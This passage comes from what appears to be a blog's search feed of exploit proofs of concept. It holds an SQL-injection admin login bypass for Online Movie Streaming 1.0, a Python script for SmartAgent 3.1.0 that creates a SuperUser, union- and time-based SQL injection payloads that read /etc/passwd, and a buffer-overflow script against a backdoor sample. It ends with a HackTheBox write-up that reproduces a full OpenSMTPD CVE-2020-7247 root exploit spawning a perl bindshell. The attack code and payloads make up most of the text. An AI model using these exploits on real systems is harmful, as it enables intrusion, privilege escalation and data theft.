class="hljs-built_in">format</span>(CMD))<br>s.send(payload)<br>print(s.recv(<span class="hljs-number">1024</span>))<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Exploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>poc</tag>
      
      <tag>Remote Code Execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Online Movie Streaming 1.0 SQL Injection</title>
    <link href="/2021/01/14/Online-Movie-Streaming-1-0-SQL-Injection/"/>
    <url>/2021/01/14/Online-Movie-Streaming-1-0-SQL-Injection/</url>
    
    <content type="html"><![CDATA[<h4 id="Online-Movie-Streaming-1-0-Admin-Authentication-Bypass"><a href="#Online-Movie-Streaming-1-0-Admin-Authentication-Bypass" class="headerlink" title="Online Movie Streaming 1.0 - Admin Authentication Bypass"></a>Online Movie Streaming 1.0 - Admin Authentication Bypass</h4><h6 id="Tested-On-Windows-10-Home-19041-x64-86-XAMPP-7-2-34"><a href="#Tested-On-Windows-10-Home-19041-x64-86-XAMPP-7-2-34" class="headerlink" title="Tested On: Windows 10 Home 19041 (x64_86) + XAMPP 7.2.34"></a>Tested On: Windows 10 Home 19041 (x64_86) + XAMPP 7.2.34</h6><p>Exploit URL: <a href="http://target/onlinemovies/Plogin.php">http://TARGET/onlinemovies/Plogin.php</a></p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">POST /onlinemovies/Plogin.php HTTP/1.1<br>Host: TARGET<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 48<br>Origin: http://TARGET<br>Connection: close<br>Cookie: PHPSESSID=p09pmo49cb8dr0s75r1jhttlvj<br>Upgrade-Insecure-Requests: 1<br><br>mail=admin%40a.com&amp;pass=ad`&#x27;+or+1=1+--+-a&amp;login=<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Exploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>poc</tag>
      
      <tag>SQL Injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SmartAgent 3.1.0 Privilege Escalation</title>
    <link href="/2021/01/13/SmartAgent-3-1-0-Privilege-Escalation/"/>
    <url>/2021/01/13/SmartAgent-3-1-0-Privilege-Escalation/</url>
    
    <content type="html"><![CDATA[<h3 id="SmartAgent-3-1-0-Privilege-Escalation"><a href="#SmartAgent-3-1-0-Privilege-Escalation" class="headerlink" title="SmartAgent 3.1.0 Privilege Escalation"></a>SmartAgent 3.1.0 Privilege Escalation</h3><p>A Low grade user like ViewOnly can create an account with SuperUser<br>permission.  </p><p>Steps To Reproduce:  </p><ol><li>Create a user with ViewOnly  </li><li>Visit <a href="https://demo.localhost.com/#/CampaignManager/users">https://demo.localhost.com/#/CampaignManager/users</a>  </li><li>Now you will be able to create an account with SuperUser.</li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><br><span class="hljs-comment">#Python Exploit [Replace With Your Authorization Code]  </span><br>  <br><span class="hljs-keyword">import</span> requests  <br>  <br>session = requests.Session()  <br>  <br>rawBody = <span class="hljs-string">&quot;&#123;\&quot;username\&quot;:\&quot;orion@hridoy.com  </span><br><span class="hljs-string">\&quot;,\&quot;password\&quot;:\&quot;Orionhridoy69\&quot;,\&quot;appName\&quot;:\&quot;AppEngage\&quot;,\&quot;role\&quot;:\&quot;Admin\&quot;,\&quot;android\&quot;:\&quot;1\&quot;,\&quot;ios\&quot;:\&quot;0\&quot;,\&quot;kai\&quot;:\&quot;0\&quot;&#125;&quot;</span>  <br>headers = &#123;<span class="hljs-string">&quot;Authorization&quot;</span>:<span class="hljs-string">&quot;id=orion@gmail.com,engageToken=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJvcmlvbkBnbWFpbC5jb20iLCJyb2xlcyI6WyJWaWV3T25seSJdLCJhcHBOYW1lIjoiQXBwRW5nYWdlIiwicGxhdGZvcm0iOiJBTkRST0lEIiwiaXNzIjoiRU5BR0FHRSIsImlhdCI6MTYxMDM3NDEyMCwiZXhwIjoxNjExMjM4MTIwfQ.SbnZaRe3-2GOFOm7QDzvIBQCKBAK_GV-wKsMoH4GGChyjUFe2Ij4LiVl5rXsWRfTqNnJXj9fFxYTzkD2-kXlAQ&quot;</span>,<span class="hljs-string">&quot;Accept&quot;</span>:<span class="hljs-string">&quot;application/json,  </span><br><span class="hljs-string">text/plain, */*&quot;</span>,<span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64;  </span><br><span class="hljs-string">rv:52.0) Gecko/20100101  </span><br><span class="hljs-string">Firefox/52.0&quot;</span>,<span class="hljs-string">&quot;Referer&quot;</span>:<span class="hljs-string">&quot;https://demo.localhost.com/&quot;</span>,<span class="hljs-string">&quot;Connection&quot;</span>:<span class="hljs-string">&quot;close&quot;</span>,<span class="hljs-string">&quot;Accept-Language&quot;</span>:<span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>,<span class="hljs-string">&quot;Accept-Encoding&quot;</span>:<span class="hljs-string">&quot;gzip,  </span><br><span class="hljs-string">deflate&quot;</span>,<span class="hljs-string">&quot;DNT&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/json&quot;</span>&#125;  <br>response = session.post(<span class="hljs-string">&quot;https://demo.localhost.com/api/createUser&quot;</span>,  <br>data=rawBody, headers=headers)  <br>  <br>print(<span class="hljs-string">&quot;User Created With\nUser: orion@hridoy.com\nPass: Orionhridoy69&quot;</span>)<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Exploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>poc</tag>
      
      <tag>Privilege Escalation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cemetery Mapping And Information System 1.0 SQL Injection</title>
    <link href="/2021/01/13/Cemetery-Mapping-And-Information-System-1-0-SQL-Injection/"/>
    <url>/2021/01/13/Cemetery-Mapping-And-Information-System-1-0-SQL-Injection/</url>
    
    <content type="html"><![CDATA[<h3 id="Cemetery-Mapping-And-Information-System-1-0-SQL-Injection"><a href="#Cemetery-Mapping-And-Information-System-1-0-SQL-Injection" class="headerlink" title="Cemetery Mapping And Information System 1.0 SQL Injection"></a>Cemetery Mapping And Information System 1.0 SQL Injection</h3><p>SQL Injection is a type of an injection attack that makes it possible to execute malicious SQL statements. Due to unsanitized user input, the attacker can retrieve the entire SQL database in this case.  </p><p>Explanation:  </p><p>The function “person.php” takes user input through the search bar at line 45:  </p><p>“$_POST[‘search’]”  </p><p>and uses it without any sanitization for the following SQL statement (line 46-49):  </p><p>$sql = “SELECT * FROM tblpeople WHERE FNAME LIKE ‘%”.$search.”%’”;<br>$mydb-&gt;setQuery($sql);<br>$cur = $mydb-&gt;executeQuery();<br>$numrows = $mydb-&gt;num_rows($cur);//get the number of count  </p><p>A single quote (‘) at the search bar under <a href="http://localhost/CemeteryMapping/index.php?q=person">http://localhost/CemeteryMapping/index.php?q=person</a> will result in SQL synthax errors.  </p><p>Proof of Concept:  </p><p>Since the php code lacks of sanitization of the user input, multiple SQL injection queries can be found.  </p><ol><li>Boolean-based SQL injection  </li></ol><p>POST request the page /CemeteryMapping/index.php?q=person and use as payload: ‘ or 1=1 –  </p><p>search=’ or 1=1 –  </p><ol start="2"><li>Union-based SQL injection  </li></ol><p>To retrieve sensitive files like /etc/passwd, use the following payload at the search bar (POST request <a href="http://localhost/CemeteryMapping/index.php?q=person">http://localhost/CemeteryMapping/index.php?q=person</a>):  </p><p>search=’ UNION SELECT NULL,load_file(‘/etc/passwd’),NULL,NULL,NULL,NULL,NULL– -  </p><p>If you want to enumerate the target system further, replace “load_file(‘/etc/passwd’)” with one of the following MySQL commands:  </p><p>@@hostname : Current Hostname  </p><p>@@tmpdir : Temp Directory  </p><p>@@datadir : Data Directory  </p><p>@@version : Version of DB  </p><p>@@basedir : Base Directory  </p><p>user() : Current User  </p><p>database() : Current Database  </p><p>version() : Version  </p><p>schema() : current Database  </p><p>UUID() : System UUID key  </p><p>current_user() : Current User  </p><p>current_user : Current User  </p><p>system_user() : Current System user  </p><p>session_user() : Session user  </p><p>@@GLOBAL.have_symlink : Check if Symlink is enabled or disabled  </p><p>@@GLOBAL.have_ssl : Check if it have SSL or not  </p><ol start="3"><li>Time-based SQL injection  </li></ol><p>For time-based SQL injection, use the payload: ‘ AND (SELECT 2634 FROM (SELECT(SLEEP(5)))muaN)– -  </p>]]></content>
    
    
    <categories>
      
      <category>Exploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>poc</tag>
      
      <tag>SQL Injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Exploit Backdoor.Win32.Zombam.a Remote Stack Buffer Overflow</title>
    <link href="/2021/01/13/Exploit-Backdoor-Win32-Zombam-a-Remote-Stack-Buffer-Overflow/"/>
    <url>/2021/01/13/Exploit-Backdoor-Win32-Zombam-a-Remote-Stack-Buffer-Overflow/</url>
    
    <content type="html"><![CDATA[<h3 id="Exploit-Backdoor-Win32-Zombam-a-Remote-Stack-Buffer-Overflow"><a href="#Exploit-Backdoor-Win32-Zombam-a-Remote-Stack-Buffer-Overflow" class="headerlink" title="Exploit Backdoor.Win32.Zombam.a Remote Stack Buffer Overflow"></a>Exploit Backdoor.Win32.Zombam.a Remote Stack Buffer Overflow</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Description: The malware listens on TCP port 80, sending an </span><br><span class="hljs-string">HTTP GET request with 300 or more bytes will trigger buffer</span><br><span class="hljs-string">overflow overwriting EIP.  Type: PE32 </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *  <br>  <br>MALWARE_HOST=<span class="hljs-string">&quot;x.x.x.x&quot;</span>  <br>PORT=<span class="hljs-number">80</span>  <br>  <br>PACKET=<span class="hljs-string">&quot;GET /&quot;</span>+<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">300</span>+<span class="hljs-string">&quot;HTTP/1.0\r\nHost: &quot;</span>+MALWARE_HOST  <br>  <br>s=socket(AF_INET, SOCK_STREAM)  <br>s.connect((MALWARE_HOST, PORT))  <br>s.send(PACKET)  <br>s.close()  <br>print(<span class="hljs-string">&quot;Backdoor.Win32.Zombam.a / Remote Stack Buffer Overflow&quot;</span>)  <br>print(<span class="hljs-string">&quot;MD5: 6c5081e9b65a52963b0b1ae612ef7eb4&quot;</span>)  <br>print(<span class="hljs-string">&quot;By Malvuln&quot;</span>)  <br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Exploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Remote Stack Buffer Overflow</tag>
      
      <tag>poc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox-OpenKeys WriteUp</title>
    <link href="/2021/01/12/HackTheBox-OpenKeys/"/>
    <url>/2021/01/12/HackTheBox-OpenKeys/</url>
    
    <content type="html"><![CDATA[<h3 id="HackTheBox-OpenKeys-WriteUp"><a href="#HackTheBox-OpenKeys-WriteUp" class="headerlink" title="HackTheBox-OpenKeys WriteUp"></a>HackTheBox-OpenKeys WriteUp</h3><h4 id="INT"><a href="#INT" class="headerlink" title="INT"></a>INT</h4><h6 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h6><div class="hljs code-wrapper"><pre><code>&gt; IP: 10.10.10.199&gt; port:22&gt; 22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)&gt; port:80&gt; OpenKeyS - Retrieve your OpenSSH Keys #maybe keyword&gt; OS:FreeBsd</code></pre></div><h4 id="Port-80-Enum-FootHold"><a href="#Port-80-Enum-FootHold" class="headerlink" title="Port 80 Enum FootHold"></a>Port 80 Enum FootHold</h4><div class="hljs code-wrapper"><pre><code>&gt; http://10.10.10.199/includes/auth.php.swp&gt; jennifer&gt; jenniferopenkeys.htb/var/www/htdocs/includes/auth.php&gt; OpenBSD authentication login POC (can use)</code></pre></div><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">POST /index.php HTTP/1.1<br>Host: 10.10.10.199<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 41<br>Origin: http://10.10.10.199<br>Connection: close<br>Referer: http://10.10.10.199/index.php<br>Cookie: PHPSESSID=8hivfuib14nvufhqeejtqigfqf;username=jennifer<br>Upgrade-Insecure-Requests: 1<br><br>username=&quot;-schallenge&quot;&amp;password=&quot;-schallenge&quot;<br></code></pre></div></td></tr></table></figure><div class="hljs code-wrapper"><pre><code>&gt; Get SSH key</code></pre></div><h4 id="User"><a href="#User" class="headerlink" title="User"></a>User</h4><div class="hljs code-wrapper"><pre><code>&gt; ssh -i ssh.key jennifer@10.10.10.199</code></pre></div><h4 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h4><div class="hljs code-wrapper"><pre><code>&gt; CVE-2020-7247</code></pre></div><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span><br><span class="hljs-meta">#</span><span class="bash"> root66 - OpenBSD 6.6 OpenSMTPD 6.6 <span class="hljs-built_in">local</span> root exploit <span class="hljs-keyword">for</span> CVE-2020-7247</span><br><span class="hljs-meta">#</span><span class="bash"> starts a perl bindshell on port 1337 with root privileges</span><br><span class="hljs-meta">#</span><br><span class="bash"><span class="hljs-comment"># Code mostly stolen from Qualys PoCs:</span></span><br><span class="hljs-meta">#</span><span class="bash"> - https://www.openwall.com/lists/oss-security/2020/01/28/3</span><br><span class="hljs-meta">#</span><span class="bash"> - https://blog.qualys.com/laws-of-vulnerabilities/2020/01/29/openbsd-opensmtpd-remote-code-execution-vulnerability-cve-2020-7247</span><br><span class="hljs-meta">#</span><span class="bash"> - https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt</span><br><span class="hljs-meta">#</span><span class="bash"> ---</span><br><span class="hljs-meta">#</span><span class="bash"> openbsd-6-6-x64$ ./root66</span><br><span class="hljs-meta">#</span><span class="bash"> OpenBSD 6.6 OpenSMTPD 6.6 <span class="hljs-built_in">local</span> root exploit (CVE-2020-7247)</span><br><span class="hljs-meta">#</span><span class="bash"> [*] id: uid=1001(<span class="hljs-built_in">test</span>) gid=1001(<span class="hljs-built_in">test</span>) groups=1001(<span class="hljs-built_in">test</span>)</span><br><span class="hljs-meta">#</span><span class="bash"> [*] checking system ...</span><br><span class="hljs-meta">#</span><span class="bash"> [*] directory /tmp/.payload is writable</span><br><span class="hljs-meta">#</span><span class="bash"> [*] 019_smtpd_exec patch has not been installed</span><br><span class="hljs-meta">#</span><span class="bash"> [*] writing payload to /tmp/.payload ...</span><br><span class="hljs-meta">#</span><span class="bash"> [*] executing /tmp/.payload ...</span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">220 openbsd-6-6-x64.localdomain ESMTP OpenSMTPD</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; EHLO localhost</span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250-openbsd-6-6-x64.localdomain Hello localhost [local], pleased to meet you</span></span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250-8BITMIME</span></span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250-ENHANCEDSTATUSCODES</span></span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250-SIZE 36700160</span></span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250 HELP</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; MAIL FROM:&lt;;/tmp/.payload;<span class="hljs-comment">#@&gt;</span></span>  <br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250 2.0.0 Ok</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; RCPT TO:&lt;<span class="hljs-built_in">test</span>@openbsd-6-6-x64.localdomain&gt;</span> <br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250 2.1.5 Destination address valid: Recipient ok</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; DATA</span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">354 Enter mail, end with &quot;.&quot; on a line by itself</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; .</span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250 2.0.0 9493d192 Message accepted for delivery</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; QUIT</span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">221 2.0.0 Bye</span></span><br><span class="hljs-meta">#</span><span class="bash"> [*] cleaning up /tmp/.payload ...</span><br><span class="hljs-meta">#</span><span class="bash"> [*] connecting to 127.0.0.1:1337 ...</span><br><span class="hljs-meta">#</span><span class="bash"> Connection to 127.0.0.1 1337 port [tcp/*] succeeded!</span><br><span class="hljs-meta">#</span><span class="bash"> id</span><br><span class="hljs-meta">#</span><span class="bash"> uid=0(root) gid=0(wheel) groups=0(wheel)</span><br><span class="hljs-meta">#</span><span class="bash"> uname -a</span><br><span class="hljs-meta">#</span><span class="bash"> OpenBSD openbsd-6-6-x64.localdomain 6.6 GENERIC<span class="hljs-comment">#353 amd64</span></span><br><span class="hljs-meta">#</span><span class="bash"> ---</span><br><span class="hljs-meta">#</span><span class="bash"> 2020-01-31 - &lt;bcoles@gmail.com&gt;</span><br><span class="hljs-meta">#</span><span class="bash"> https://github.com/bcoles/local-exploits/tree/master/CVE-2020-7247</span><br><br>payload=&quot;/tmp/.payload&quot;<br><br>/bin/echo &quot;OpenBSD 6.6 OpenSMTPD 6.6 local root exploit (CVE-2020-7247)&quot;<br><br>/bin/echo &quot;[*] id: `id`&quot;<br><br>/bin/echo &quot;[*] checking system ...&quot;<br><br>if [ -w `dirname $payload` ]; then<br>  /bin/echo &quot;[*] directory $payload is writable&quot;<br>else<br>  /bin/echo &quot;[-] directory $payload is not writable&quot;<br>  exit 1<br>fi<br><br>if syspatch -l | grep -q 019_smtpd_exec ; then<br>  /bin/echo &quot;[-] 019_smtpd_exec patch has been installed&quot;<br>  exit 1<br>else<br>  /bin/echo &quot;[*] 019_smtpd_exec patch has not been installed&quot;<br>fi<br><br>/bin/echo &quot;[*] writing payload to $payload ...&quot;<br>cat &gt; $payload &lt;&lt; &quot;EOF&quot;<br><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span><br>perl -MIO -e &#x27;$p=fork();exit,if$p;foreach my $key(keys %ENV)&#123;if($ENV&#123;$key&#125;=~/(.*)/)&#123;$ENV&#123;$key&#125;=$1;&#125;&#125;$c=new IO::Socket::INET(LocalPort,1337,Reuse,1,Listen)-&gt;accept;$~-&gt;fdopen($c,w);STDIN-&gt;fdopen($c,r);while(&lt;&gt;)&#123;if($_=~ /(.*)/)&#123;system $1;&#125;&#125;;&#x27;<br>EOF<br>/bin/chmod +x $payload<br><br>/bin/echo &quot;[*] executing $payload ...&quot;<br>/bin/echo | /usr/sbin/sendmail -v -f &quot;&lt;;$payload;#@&gt;&quot; `whoami`<br><br>/bin/sleep 1<br><br>/bin/echo &quot;[*] cleaning up $payload ...&quot;<br>/bin/rm $payload<br><br>/bin/echo &quot;[*] connecting to 127.0.0.1:1337 ...&quot;<br>nc -v 127.0.0.1 1337<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
      <tag>CVE-2020-7247</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
